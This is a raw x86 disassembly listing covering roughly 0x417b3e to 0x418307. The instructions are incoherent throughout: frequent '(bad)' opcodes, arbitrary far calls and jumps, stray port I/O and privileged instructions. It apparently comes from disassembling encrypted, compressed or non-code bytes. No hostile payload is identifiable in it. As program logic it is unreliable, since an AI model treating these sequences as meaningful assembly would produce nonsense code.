  417b3e:	cmp    al,0xee
  417b40:	mov    ebx,0xd8c3f027
  417b45:	je     0x417af9
  417b47:	fcomp  DWORD PTR [edi-0xc]
  417b4a:	fldcw  WORD PTR [ebp-0x7684fd45]
  417b50:	rcr    dl,cl
  417b52:	xlat   BYTE PTR ds:[ebx]
  417b53:	inc    edx
  417b54:	cwde   
  417b55:	jp     0x417b1e
  417b57:	push   ss
  417b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b59:	es js  0x417b70
  417b5c:	push   es
  417b5d:	pop    eax
  417b5e:	mov    edx,0x5d21dcd1
  417b63:	inc    esp
  417b64:	and    al,0x43
  417b66:	or     DWORD PTR [esi-0x30f2c20e],esi
  417b6c:	ret    
  417b6d:	lock inc ebx
  417b6f:	call   0xd7c:0x879d4444
  417b76:	and    al,0x33
  417b78:	call   0xa0dd:0xab595cce
  417b7f:	clc    
  417b80:	push   0xc2ef43c6
  417b85:	mov    eax,0x5f409b7b
  417b8a:	cmp    edi,edx
  417b8c:	add    eax,0x234058b6
  417b91:	xchg   DWORD PTR [edx-0x7b21fdb9],eax
  417b97:	shl    ecx,1
  417b99:	jmp    0x417c18
  417b9b:	jns    0x417bd5
  417b9d:	daa    
  417b9e:	fld    QWORD PTR [ebx+ebp*4-0x6bafe22e]
  417ba5:	retf   0xde21
  417ba8:	imul   edi,DWORD PTR [eax-0x64cb8b47],0x1c9feef8
  417bb2:	jo     0x417bfb
  417bb4:	iret   
  417bb5:	jmp    0x417b7c
  417bb7:	cld    
  417bb8:	lods   al,BYTE PTR ds:[esi]
  417bb9:	xlat   BYTE PTR ds:[ebx]
  417bba:	sub    DWORD PTR [edi-0x161d75d3],ebp
  417bc0:	cmp    ecx,edi
  417bc2:	ins    BYTE PTR es:[edi],dx
  417bc3:	mov    eax,0x1759c2c3
  417bc8:	add    BYTE PTR [ecx],0x7e
  417bcb:	popf   
  417bcc:	sbb    eax,0xeb533686
  417bd1:	jbe    0x417b77
  417bd3:	(bad)  
  417bd4:	xchg   ebp,eax
  417bd5:	sub    al,0x92
  417bd7:	push   ebx
  417bd8:	loopne 0x417c19
  417bda:	pop    esp
  417bdb:	mov    bh,0x24
  417bdd:	dec    edx
  417bde:	test   eax,0xe40f94ea
  417be3:	test   al,0xa9
  417be5:	mov    eax,DWORD PTR [edx]
  417be7:	xor    eax,0x48e9b5e5
  417bec:	add    eax,DWORD PTR [ecx+0x64]
  417bef:	call   0x6f0a4f23
  417bf4:	xchg   ebp,eax
  417bf5:	pop    ds
  417bf6:	retf   0x8570
  417bf9:	neg    BYTE PTR [edi-0x77]
  417bfc:	(bad)  
  417bfe:	into   
  417bff:	jmp    0x1b01d1c7
  417c04:	je     0x417baf
  417c06:	rol    DWORD PTR [esp+ecx*8],1
  417c09:	rcl    DWORD PTR [edx*2-0x1f586a59],cl
  417c10:	mov    eax,ds:0x1e037e76
  417c15:	psllw  mm1,mm4
  417c18:	repnz pop edi
  417c1a:	ins    DWORD PTR es:[edi],dx
  417c1b:	ret    
  417c1c:	sub    BYTE PTR [edx-0x2e],0x56
  417c20:	popf   
  417c21:	push   es
  417c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c23:	pop    esp
  417c24:	inc    edx
  417c25:	adc    ch,ch
  417c27:	and    DWORD PTR [edi+0x41e0adaa],ebx
  417c2d:	aad    0x35
  417c2f:	stc    
  417c30:	push   ebx
  417c31:	mov    DWORD PTR [eax],ebx
  417c33:	in     al,dx
  417c34:	ins    BYTE PTR es:[edi],dx
  417c35:	or     bl,0x1
  417c38:	cmp    al,0xd0
  417c3a:	xor    eax,0xabe6804e
  417c3f:	xlat   BYTE PTR ds:[ebx]
  417c40:	xor    cl,bl
  417c42:	mov    edx,0x2422c3b7
  417c47:	in     al,dx
  417c48:	lods   al,BYTE PTR ds:[esi]
  417c49:	aas    
  417c4a:	les    ebx,FWORD PTR [edx-0x196b8702]
  417c50:	shl    WORD PTR [ecx-0x19],0x4d
  417c55:	cs dec esp
  417c57:	test   BYTE PTR [esi],dh
  417c59:	jecxz  0x417c35
  417c5b:	data16 scas al,BYTE PTR es:[edi]
  417c5d:	jecxz  0x417c5d
  417c5f:	add    al,0x7a
  417c61:	ss dec edi
  417c63:	xor    BYTE PTR [ecx],0x68
  417c66:	sbb    DWORD PTR [ecx+0x6c7caff0],eax
  417c6c:	ret    
  417c6d:	fild   DWORD PTR [esi-0x5a]
  417c70:	data16 jno 0x417cec
  417c73:	aad    0x54
  417c75:	daa    
  417c76:	stos   DWORD PTR es:[edi],eax
  417c77:	and    ecx,DWORD PTR [eax-0x7d3c0774]
  417c7d:	push   0x32
  417c7f:	pop    edx
  417c80:	cs fucom st(7)
  417c83:	push   cs
  417c84:	stc    
  417c85:	cdq    
  417c86:	mov    al,ds:0x79071867
  417c8b:	add    dh,BYTE PTR [edx-0x1053d66a]
  417c91:	sbb    edi,ebp
  417c93:	add    eax,0x9adc4784
  417c98:	jge    0x417cd5
  417c9a:	int    0xe
  417c9c:	xchg   edx,eax
  417c9d:	mov    cl,0x43
  417c9f:	(bad)  
  417ca0:	pushf  
  417ca1:	mov    ecx,0xe8e92463
  417ca6:	sbb    eax,DWORD PTR [esi-0x6e]
  417ca9:	nop
  417caa:	xchg   edx,eax
  417cab:	xor    DWORD PTR [ebx],ecx
  417cad:	dec    edi
  417cae:	mov    WORD PTR [ebx+0x2a88b794],cs
  417cb4:	xor    bl,BYTE PTR [ecx-0x4e]
  417cb7:	mov    edi,edi
  417cb9:	es je  0x417ca4
  417cbc:	and    DWORD PTR [ebx],edx
  417cbe:	cmp    al,0x0
  417cc0:	ja     0x417c59
  417cc2:	(bad)  
  417cc3:	test   BYTE PTR [edi+ebp*2-0x66f8c590],0x76
  417ccb:	sbb    ah,0x52
  417cce:	into   
  417ccf:	les    edi,FWORD PTR [edx-0x5c]
  417cd2:	xchg   ebp,eax
  417cd3:	ficomp DWORD PTR [eax+0x16]
  417cd6:	dec    edi
  417cd7:	jo     0x417cf8
  417cd9:	push   esi
  417cda:	mov    eax,0x73521c38
  417cdf:	sbb    eax,0x6eef66e7
  417ce4:	rol    DWORD PTR [edx],cl
  417ce6:	push   es
  417ce7:	sti    
  417ce8:	push   ebx
  417ce9:	loope  0x417d2a
  417ceb:	pop    edx
  417cec:	pop    es
  417ced:	(bad)  
  417cee:	fisttp DWORD PTR [esi]
  417cf0:	inc    eax
  417cf1:	out    dx,al
  417cf2:	mov    edx,DWORD PTR [ebp+eiz*1+0x15457de4]
  417cf9:	push   edx
  417cfa:	dec    ecx
  417cfb:	adc    eax,0x952f3fa
  417d00:	punpcklwd mm6,mm1
  417d03:	jnp    0x417d3d
  417d05:	xchg   ecx,eax
  417d06:	scas   al,BYTE PTR es:[edi]
  417d07:	xchg   edx,eax
  417d08:	mov    dl,0xda
  417d0a:	jne    0x417cf3
  417d0c:	dec    ebx
  417d0d:	dec    edx
  417d0e:	int3   
  417d0f:	xor    ebp,DWORD PTR [ecx-0x7b]
  417d12:	dec    ebx
  417d13:	cmp    al,0x32
  417d15:	cmp    DWORD PTR [ecx-0x315e6013],ebp
  417d1b:	inc    edx
  417d1c:	aaa    
  417d1d:	cwde   
  417d1e:	or     al,0x4a
  417d20:	int    0xff
  417d22:	pop    ebx
  417d23:	mov    ecx,DWORD PTR [edx]
  417d25:	lea    ebx,[edi-0x70ff3b0a]
  417d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d2c:	mov    cl,0xc
  417d2e:	sbb    bh,BYTE PTR [esi+0x4c0974fb]
  417d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d35:	push   ebx
  417d36:	pop    es
  417d37:	add    al,0x9a
  417d39:	jne    0x417d9d
  417d3b:	sbb    DWORD PTR [ebx+0x3],esi
  417d3e:	jbe    0x417d3e
  417d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d41:	call   0x9401d440
  417d46:	pop    esp
  417d47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d48:	sbb    al,0x38
  417d4a:	sub    BYTE PTR [ebx+0x54f8780],dl
  417d50:	daa    
  417d51:	inc    edi
  417d52:	pop    ds
  417d53:	sub    al,cl
  417d55:	test   BYTE PTR [ecx-0x7e3e51fe],bl
  417d5b:	pushf  
  417d5c:	xchg   ebx,eax
  417d5d:	cmp    eax,0x5f599c4e
  417d62:	sbb    DWORD PTR [esi-0x46d5cb4b],edi
  417d68:	and    al,0xae
  417d6a:	inc    eax
  417d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d6c:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417d6e:	fimul  WORD PTR [ebx]
  417d70:	(bad)  
  417d71:	and    ch,dh
  417d73:	add    eax,0x19a9b46d
  417d78:	call   0x562bcd07
  417d7d:	(bad)  
  417d7f:	mov    DWORD PTR [edi],ebx
  417d81:	mov    es,WORD PTR [esi+0x1da252f9]
  417d87:	retf   0x5868
  417d8a:	lahf   
  417d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d8c:	int3   
  417d8d:	mov    esp,0xaf1d4a3a
  417d92:	pminsw mm1,mm4
  417d95:	jmp    0x7488195c
  417d9a:	fcomp  QWORD PTR [edx+0x63]
  417d9d:	retf   0x6ae8
  417da0:	test   BYTE PTR [edx+0x2],0x85
  417da4:	bound  ebp,QWORD PTR [ebx+0x7707ddce]
  417daa:	test   DWORD PTR [ecx-0x1f],esi
  417dad:	imul   ebx,DWORD PTR ds:0x9bed5e84,0xe6738338
  417db7:	pop    ebx
  417db8:	in     al,0x9b
  417dba:	adc    eax,0xedd35b9b
  417dbf:	jecxz  0x417d61
  417dc1:	jecxz  0x417d86
  417dc3:	pop    ecx
  417dc4:	ror    DWORD PTR [esi-0x114cee26],0xd3
  417dcb:	push   ss
  417dcc:	ret    0x504d
  417dcf:	ds jae 0x417e40
  417dd2:	jae    0x417dfe
  417dd4:	mov    dh,BYTE PTR [ecx+0x3]
  417dd7:	xor    ch,BYTE PTR [edx+0x2e4322e]
  417ddd:	pop    esi
  417dde:	loopne 0x417e5e
  417de0:	adc    al,0xc4
  417de2:	ret    
  417de3:	xchg   BYTE PTR [edx],dl
  417de5:	aam    0xa8
  417de7:	pop    ebp
  417de8:	sub    BYTE PTR [ecx],al
  417dea:	frstor ss:[esi-0x56]
  417dee:	test   eax,0xb04fdc29
  417df3:	cmp    ebx,DWORD PTR [eax-0x7bd96a24]
  417df9:	sbb    eax,0x78d712c
  417dff:	push   0x64f71031
  417e04:	loopne 0x417d97
  417e06:	xlat   BYTE PTR ds:[ebx]
  417e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e08:	mov    ds:0xd045a590,eax
  417e0d:	mov    ebx,eax
  417e0f:	fwait
  417e10:	sub    bl,cl
  417e12:	inc    ebp
  417e13:	aaa    
  417e14:	call   0xdf89:0x328abae6
  417e1b:	sub    al,0x96
  417e1d:	adc    esi,DWORD PTR [esi]
  417e1f:	fsubrp st(2),st
  417e21:	pop    ss
  417e22:	in     eax,dx
  417e23:	xchg   ebp,eax
  417e24:	pushf  
  417e25:	pop    ds
  417e26:	inc    eax
  417e27:	mov    eax,DWORD PTR [ebx+0x49]
  417e2a:	push   edx
  417e2b:	mul    BYTE PTR [esp+edx*4+0x4118b5fd]
  417e32:	sub    dh,dl
  417e34:	mov    DWORD PTR [ebp-0x10],edx
  417e37:	dec    edi
  417e38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e39:	and    BYTE PTR [ebx-0x6360af05],0x25
  417e40:	push   es
  417e41:	pop    es
  417e42:	dec    esp
  417e43:	je     0x417e3d
  417e45:	or     DWORD PTR [ecx+0x57],ebx
  417e48:	cmp    eax,0x5bcf353a
  417e4d:	pop    ds
  417e4e:	dec    eax
  417e4f:	dec    ebp
  417e50:	sbb    eax,0xc9e1658c
  417e55:	dec    ebx
  417e56:	sbb    bh,BYTE PTR [edx+0x61eeb538]
  417e5c:	inc    ebp
  417e5d:	repnz sub esi,ecx
  417e60:	aad    0x0
  417e62:	jmp    0xa5d6300c
  417e67:	mov    ah,0x59
  417e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e6a:	jge    0x417ee6
  417e6c:	xchg   ecx,eax
  417e6d:	mov    ds:0xa4732a6,al
  417e72:	cld    
  417e73:	sub    eax,0xeab6d96
  417e78:	sub    DWORD PTR [eax+0x43],esi
  417e7b:	test   al,0xeb
  417e7d:	jmp    0x899f:0x7b281203
  417e84:	and    eax,0x679dff1e
  417e89:	and    eax,0xc0793b9d
  417e8e:	adc    BYTE PTR [ebp-0x55],bl
  417e91:	or     dl,al
  417e93:	mov    bl,0xb3
  417e95:	mov    BYTE PTR [ebx],ch
  417e97:	inc    esp
  417e98:	sbb    BYTE PTR [ebp-0x318faf66],al
  417e9e:	imul   ebx,DWORD PTR [ebx],0x5d
  417ea1:	leave  
  417ea2:	push   cs
  417ea3:	mov    WORD PTR [ebx-0x31080b06],?
  417ea9:	xor    BYTE PTR [esi+0x54e5d19d],0xa0
  417eb0:	xor    ebx,DWORD PTR [edi-0x1bf90ef2]
  417eb6:	adc    BYTE PTR [edx-0x49d44376],ah
  417ebc:	popf   
  417ebd:	mov    dh,0x92
  417ebf:	pop    ebx
  417ec0:	into   
  417ec1:	imul   edx,DWORD PTR [esi],0xa322904e
  417ec7:	pusha  
  417ec8:	jo     0x417eb2
  417eca:	out    0xbd,eax
  417ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ecd:	hlt    
  417ece:	mov    eax,ds:0xa7964b2b
  417ed3:	or     bh,dh
  417ed5:	(bad)  
  417ed6:	cmp    al,0xb2
  417ed8:	lock and ah,cl
  417edb:	mov    BYTE PTR [esi+0x50a8b62b],al
  417ee1:	retf   0xcccf
  417ee4:	inc    ecx
  417ee5:	lods   eax,DWORD PTR ds:[esi]
  417ee6:	mov    ecx,0x76249b76
  417eeb:	sub    BYTE PTR [esi-0x1a2bea4c],0xa7
  417ef2:	inc    ecx
  417ef3:	jae    0x417f48
  417ef5:	out    dx,al
  417ef6:	std    
  417ef7:	popf   
  417ef8:	mul    DWORD PTR [esi]
  417efa:	sbb    al,BYTE PTR [esp+ebp*1]
  417efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417efe:	and    al,al
  417f00:	xor    eax,0xb5667947
  417f05:	mov    cl,0x9
  417f07:	in     al,dx
  417f08:	or     eax,0x308b4edb
  417f0d:	xchg   ecx,eax
  417f0e:	push   es
  417f0f:	mov    edx,0x9f942dbd
  417f14:	ror    BYTE PTR [esi],0xa4
  417f17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f18:	outs   dx,BYTE PTR ds:[esi]
  417f19:	fisub  DWORD PTR [edx+esi*1+0x7ae6202c]
  417f20:	adc    BYTE PTR [eax+0x31],ah
  417f23:	ja     0x417f26
  417f25:	in     al,dx
  417f26:	pop    eax
  417f27:	mov    ebx,0x8d3931be
  417f2c:	rcl    BYTE PTR ds:0x3cb8d65f,cl
  417f32:	iret   
  417f33:	repz out dx,eax
  417f35:	mov    ebx,0x9e343c82
  417f3a:	outs   dx,DWORD PTR ds:[esi]
  417f3b:	mov    ecx,0xf2a4bcdf
  417f40:	cs jne 0x417f3b
  417f43:	jg     0x417f07
  417f45:	mov    al,ds:0xe48e4e6f
  417f4a:	push   esi
  417f4b:	ds (bad) 
  417f4d:	fbstp  TBYTE PTR [eax]
  417f4f:	jg     0x417f98
  417f51:	outs   dx,BYTE PTR ds:[esi]
  417f52:	jecxz  0x417f40
  417f54:	in     al,dx
  417f55:	(bad)  
  417f56:	push   ds
  417f57:	add    eax,0xc34efc80
  417f5c:	loope  0x417fa8
  417f5e:	jo     0x417fa2
  417f60:	pop    DWORD PTR [edi]
  417f62:	mov    ecx,0xacbab197
  417f67:	pop    ebx
  417f68:	(bad)  
  417f69:	pop    ss
  417f6a:	jecxz  0x417fc2
  417f6c:	and    ecx,DWORD PTR [ebx]
  417f6e:	das    
  417f6f:	mov    ds:0xb69524a3,al
  417f74:	or     eax,0x94f0db65
  417f79:	jae    0x417f4e
  417f7b:	out    dx,al
  417f7c:	add    ecx,0x6a831a5b
  417f82:	stos   BYTE PTR es:[edi],al
  417f83:	inc    edx
  417f84:	and    al,0x90
  417f86:	(bad)  
  417f87:	or     dh,bl
  417f89:	mov    edi,0xe185fcfc
  417f8e:	add    ecx,esp
  417f90:	outs   dx,BYTE PTR ds:[esi]
  417f91:	pop    esp
  417f92:	outs   dx,BYTE PTR ds:[esi]
  417f93:	rol    DWORD PTR [eax+0xd6fd1a4],1
  417f99:	xor    ch,dh
  417f9b:	cwde   
  417f9c:	fcom   QWORD PTR cs:[ebx]
  417f9f:	ja     0x417fdc
  417fa1:	fwait
  417fa2:	adc    DWORD PTR [eax-0x38],0xffffffea
  417fa6:	xor    al,BYTE PTR [ebp+0x7ac987d3]
  417fac:	xor    eax,esi
  417fae:	pusha  
  417faf:	adc    DWORD PTR [edi-0x3e154078],0xc1187114
  417fb9:	adc    eax,0x15df36f2
  417fbe:	stos   BYTE PTR es:[edi],al
  417fbf:	ins    BYTE PTR es:[edi],dx
  417fc0:	and    al,0xbd
  417fc2:	cmp    esp,DWORD PTR [esi+0xf]
  417fc5:	scas   al,BYTE PTR es:[edi]
  417fc6:	pop    esp
  417fc7:	cld    
  417fc8:	or     BYTE PTR [ebx-0x740bb0ea],ah
  417fce:	outs   dx,BYTE PTR ds:[esi]
  417fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fd0:	push   ecx
  417fd1:	lds    ecx,FWORD PTR [esp+edi*4-0x7a]
  417fd5:	fisttp DWORD PTR [ebx+0x51]
  417fd8:	jbe    0x41804b
  417fda:	dec    ebp
  417fdb:	inc    esp
  417fdc:	pushf  
  417fdd:	adc    eax,0x2a20411a
  417fe2:	ja     0x417fe4
  417fe4:	adc    BYTE PTR ds:[edx-0x1e],dh
  417fe8:	leave  
  417fe9:	bound  ecx,QWORD PTR ds:[eax]
  417fec:	mov    al,ds:0xa44ff6b7
  417ff1:	push   edx
  417ff2:	in     eax,dx
  417ff3:	aad    0x91
  417ff5:	lods   al,BYTE PTR ds:[esi]
  417ff6:	mov    dh,al
  417ff8:	sbb    DWORD PTR [edi+0x1cc95c4],ebp
  417ffe:	xchg   DWORD PTR [esi+0x23],eax
  418001:	mov    esp,0x375673c1
  418006:	or     al,0x29
  418008:	add    ebx,esi
  41800a:	pop    esi
  41800b:	faddp  st(6),st
  41800d:	push   0x681b53ac
  418012:	out    0xe,al
  418014:	lahf   
  418015:	call   0xbb9d:0xee4a096f
  41801c:	mov    dl,0x3d
  41801e:	aad    0xd0
  418020:	add    al,0xb6
  418022:	or     eax,DWORD PTR [ebx+edx*4]
  418025:	jmp    0x794b6c2
  41802a:	addr16 cmp ebx,edx
  41802d:	xlat   BYTE PTR ds:[ebx]
  41802e:	out    0x5e,al
  418030:	or     al,0xaf
  418032:	sbb    DWORD PTR [ebp-0x3f],0x55
  418036:	xor    DWORD PTR ds:0x6473dd57,ecx
  41803c:	into   
  41803d:	repz arpl WORD PTR [esi],bp
  418040:	mov    bl,0x7c
  418042:	sub    al,0x2d
  418044:	xor    eax,0xaba3d10a
  418049:	xchg   esp,eax
  41804a:	inc    edx
  41804b:	add    BYTE PTR [ecx-0x388a458],0x6d
  418052:	xor    bh,ch
  418054:	aam    0x60
  418056:	pop    esi
  418057:	aad    0x53
  418059:	pop    ebx
  41805a:	adc    al,0x8b
  41805c:	push   edx
  41805d:	dec    esi
  41805e:	xlat   BYTE PTR ds:[ebx]
  41805f:	hlt    
  418060:	sub    cl,BYTE PTR [esi-0x59]
  418063:	aas    
  418064:	inc    eax
  418065:	and    bh,bl
  418067:	sbb    al,0x80
  418069:	jmp    FWORD PTR [eax-0x7a2f44d1]
  41806f:	jnp    0x41803d
  418071:	fwait
  418072:	inc    esp
  418073:	(bad)  
  418074:	ja     0x41801e
  418076:	enter  0xcbc9,0xec
  41807a:	cmp    cl,ah
  41807c:	or     BYTE PTR [esp+eax*1-0x6258ee5e],bh
  418083:	rcr    BYTE PTR [edi],0x75
  418086:	lods   eax,DWORD PTR ds:[esi]
  418087:	imul   esi,edi,0x79
  41808a:	sbb    ch,ah
  41808c:	ds pop ds
  41808e:	js     0x418075
  418090:	hlt    
  418091:	sub    dl,BYTE PTR [edi+ebx*2+0x22]
  418095:	ja     0x41802a
  418097:	mov    ah,0xfc
  418099:	add    bl,0xd1
  41809c:	inc    edx
  41809d:	push   ebx
  41809e:	stos   DWORD PTR es:[edi],eax
  41809f:	outs   dx,BYTE PTR ds:[esi]
  4180a0:	mov    BYTE PTR [edx],dh
  4180a2:	jge    0x418053
  4180a4:	jp     0x4180ab
  4180a6:	fidivr WORD PTR [edx]
  4180a8:	jnp    0x4180b6
  4180aa:	mov    ecx,0xbca4d26d
  4180af:	jbe    0x41811e
  4180b1:	cmp    ebx,DWORD PTR [eax-0x51caf078]
  4180b7:	jno    0x418128
  4180b9:	test   BYTE PTR [eax+eiz*2+0x6305ac53],dl
  4180c0:	es dec eax
  4180c2:	ja     0x4180ba
  4180c4:	fadd   QWORD PTR [ebx]
  4180c6:	mov    dh,0x9c
  4180c8:	fsubr  QWORD PTR [ebx+ecx*1-0x7d127c54]
  4180cf:	cmp    bh,BYTE PTR [eax+0x14]
  4180d2:	imul   esp,DWORD PTR [ebx],0x102d877a
  4180d8:	mov    eax,ds:0x88fed61a
  4180dd:	rol    edi,1
  4180df:	loop   0x418140
  4180e1:	pop    esi
  4180e2:	mov    WORD PTR [eax-0x1a],ds
  4180e5:	fadd   st(4),st
  4180e7:	cli    
  4180e8:	dec    esi
  4180e9:	dec    esi
  4180ea:	cs cs call 0xcae9:0xc37f6f3
  4180f3:	scas   eax,DWORD PTR es:[edi]
  4180f4:	ja     0x418092
  4180f6:	inc    ecx
  4180f7:	inc    ebp
  4180f8:	push   0xf2fbaa00
  4180fd:	fcom   DWORD PTR [ebx+0x67]
  418100:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  418102:	mov    ah,0xba
  418104:	fidiv  DWORD PTR [esi-0x18]
  418107:	or     BYTE PTR [ebp+edx*4-0x18a2bec6],ch
  41810e:	add    DWORD PTR [ebx],esi
  418110:	jmp    0xde13:0x3f1e1162
  418117:	xor    edi,DWORD PTR [edx+eiz*2]
  41811a:	mov    DWORD PTR [ebx-0xa],esp
  41811d:	out    0xb1,al
  41811f:	jge    0x418133
  418121:	sar    DWORD PTR [ebp+0x5f5084be],1
  418127:	rol    BYTE PTR [edi+ecx*8],cl
  41812a:	xchg   DWORD PTR [ebx-0x17],ecx
  41812d:	imul   esi,DWORD PTR [ebx-0x2b5e9f72],0xffffffd4
  418134:	dec    esp
  418135:	jne    0x418100
  418137:	push   edi
  418138:	pop    ebp
  418139:	fld    st(5)
  41813b:	sbb    al,0x1e
  41813d:	sub    DWORD PTR [edi-0x33],0x37
  418141:	push   ecx
  418142:	mov    BYTE PTR [esi+eiz*8-0x2431954f],bh
  418149:	fs jl  0x418119
  41814c:	cs inc edi
  41814e:	jmp    0x54cc:0x107eecfa
  418155:	(bad)  
  418156:	xor    ch,BYTE PTR [ecx]
  418158:	je     0x4180f4
  41815a:	pop    esi
  41815b:	or     al,0xfb
  41815d:	jmp    0x41813d
  41815f:	call   0xbaa5:0xb7f83201
  418166:	sbb    al,0x42
  418168:	lahf   
  418169:	lods   eax,DWORD PTR ds:[esi]
  41816a:	outs   dx,BYTE PTR ds:[esi]
  41816b:	push   ds
  41816c:	pop    eax
  41816d:	scas   al,BYTE PTR es:[edi]
  41816e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41816f:	fdivr  QWORD PTR [eax-0x3f861813]
  418175:	cs test dh,dl
  418178:	dec    esi
  418179:	jl     0x418163
  41817b:	in     al,0x9
  41817d:	pop    ss
  41817e:	ins    DWORD PTR es:[edi],dx
  41817f:	mov    bh,0x67
  418181:	sub    cl,BYTE PTR ds:0x3e3568b2
  418187:	jae    0x418186
  418189:	add    al,0x15
  41818b:	lahf   
  41818c:	aaa    
  41818d:	rol    edx,cl
  41818f:	repnz mov cl,0xd1
  418192:	xor    cl,ch
  418194:	jne    0x418179
  418196:	cmp    ebp,DWORD PTR [edx]
  418198:	mov    esi,0xb68ba934
  41819d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41819e:	aam    0xbd
  4181a0:	push   ds
  4181a1:	mov    BYTE PTR [ebx+ebx*8],0xc6
  4181a5:	(bad)  
  4181a6:	sar    DWORD PTR [edx],1
  4181a8:	add    eax,0x69d4bc17
  4181ad:	dec    ebp
  4181ae:	jo     0x418168
  4181b0:	mov    dh,0xe1
  4181b2:	pop    es
  4181b3:	(bad)
  4181b7:	and    DWORD PTR [eax+0x3c08215c],0xffffffa4
  4181be:	push   ebp
  4181bf:	mov    bh,0x9b
  4181c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181c2:	dec    ebx
  4181c3:	cmp    al,0xb6
  4181c5:	xchg   esi,eax
  4181c6:	(bad)  
  4181c7:	mov    edx,0x1ff26d7a
  4181cc:	cmp    al,BYTE PTR [esi+0x32]
  4181cf:	jbe    0x418180
  4181d1:	pop    edi
  4181d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181d3:	add    DWORD PTR [ebp+0x5],0x6924d2fe
  4181da:	(bad)  
  4181db:	in     al,dx
  4181dc:	test   al,0xf
  4181de:	cli    
  4181df:	push   es
  4181e0:	sti    
  4181e1:	and    eax,0xae2a0b97
  4181e6:	cmp    eax,0xcc9b7f81
  4181eb:	jmp    0xf77d:0xb1a1b22
  4181f2:	cmp    al,0x4f
  4181f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181f5:	jmp    0x3de9153a
  4181fa:	pop    ebp
  4181fb:	rcl    BYTE PTR [eax+0x34827230],cl
  418201:	mov    esi,0x8d8a7cae
  418206:	add    ah,dh
  418208:	inc    ebp
  418209:	addr16 jle 0x418196
  41820c:	ret    0x5b87
  41820f:	xor    BYTE PTR [eax+0x4bf24f33],bl
  418215:	pop    ecx
  418216:	jnp    0x4181ea
  418218:	(bad)  
  41821a:	lods   al,BYTE PTR ds:[esi]
  41821b:	push   ebx
  41821c:	lods   al,BYTE PTR ds:[esi]
  41821d:	sub    ch,BYTE PTR [edx-0x2b5449eb]
  418223:	push   ecx
  418224:	out    0xb1,al
  418226:	sbb    eax,0x62bd8c2e
  41822b:	in     eax,0xe3
  41822d:	js     0x4181f6
  41822f:	adc    al,0xfb
  418231:	fstp   QWORD PTR [eax]
  418233:	or     ch,bh
  418235:	and    DWORD PTR [esp+ebx*2+0x57],ebp
  418239:	loope  0x41821c
  41823b:	mov    fs,WORD PTR [ebx-0x631c6051]
  418241:	rcl    BYTE PTR [eax],1
  418243:	push   ecx
  418244:	aad    0xc7
  418246:	mov    ds:0x3c56703d,eax
  41824b:	mov    edx,0x550b7c3d
  418250:	cmp    BYTE PTR [ebx+ebp*2-0x20],ah
  418254:	(bad)  
  418255:	cmp    BYTE PTR [esi-0x5fe379d4],ch
  41825b:	loop   0x41829d
  41825d:	mov    al,0x89
  41825f:	cwde   
  418260:	ds call 0x1620:0x78ea7085
  418268:	idiv   DWORD PTR [eax-0xe8d7054]
  41826e:	add    BYTE PTR [edx+eax*4+0x1c00cc87],bl
  418275:	cmp    eax,0xc46d9ffd
  41827a:	lods   al,BYTE PTR ds:[esi]
  41827b:	jmp    DWORD PTR [edx-0x59dfe0c9]
  418281:	add    ch,BYTE PTR [esi]
  418283:	mov    DWORD PTR [ebp-0x73],0x77d1a02e
  41828a:	aas    
  41828b:	push   edi
  41828c:	mov    eax,ds:0xf6a2f7f5
  418291:	dec    ecx
  418292:	xor    BYTE PTR ds:0xd8c9a0a1,ch
  418298:	jnp    0x4182ba
  41829a:	js     0x418315
  41829c:	dec    edi
  41829d:	out    dx,al
  41829e:	fimul  WORD PTR [edi+0x6ee1b0e6]
  4182a4:	inc    esp
  4182a5:	push   0xffffffcb
  4182a7:	fcmovnb st,st(4)
  4182a9:	add    DWORD PTR [eax+ebx*8],edi
  4182ac:	xchg   BYTE PTR [edi-0x72],ch
  4182af:	stc    
  4182b0:	or     al,0x46
  4182b2:	inc    eax
  4182b3:	xlat   BYTE PTR ds:[ebx]
  4182b4:	into   
  4182b5:	push   ss
  4182b6:	adc    al,0x80
  4182b8:	mov    edi,0x10ba304
  4182bd:	out    dx,al
  4182be:	mov    BYTE PTR [edx+0x759deee2],ch
  4182c4:	ror    BYTE PTR [esp+ecx*4-0x561437e4],0xd8
  4182cc:	cmp    bh,dh
  4182ce:	lods   eax,DWORD PTR ds:[esi]
  4182cf:	pop    ecx
  4182d0:	fcmovnb st,st(6)
  4182d2:	jmp    0x4182a1
  4182d4:	call   0x6fa96f5
  4182d9:	fisttp WORD PTR [ebx+edx*1]
  4182dc:	adc    DWORD PTR [eax-0x1df9614d],esi
  4182e2:	adc    al,0x7
  4182e4:	fmul   DWORD PTR [ecx+0x1027b660]
  4182ea:	mov    ah,0x8c
  4182ec:	dec    ecx
  4182ed:	lock push ebx
  4182ef:	popf   
  4182f0:	pop    edx
  4182f1:	enter  0x1d39,0x38
  4182f5:	jbe    0x418285
  4182f7:	(bad)  
  4182f8:	in     eax,0xd5
  4182fa:	push   eax
  4182fb:	(bad)  
  4182fc:	cmc    
  4182fd:	les    edi,FWORD PTR [edi]
  4182ff:	add    eax,0xf1ee746e
  418304:	jae    0x418345
  418306:	xchg   esi,eax
  418307:	pop    es
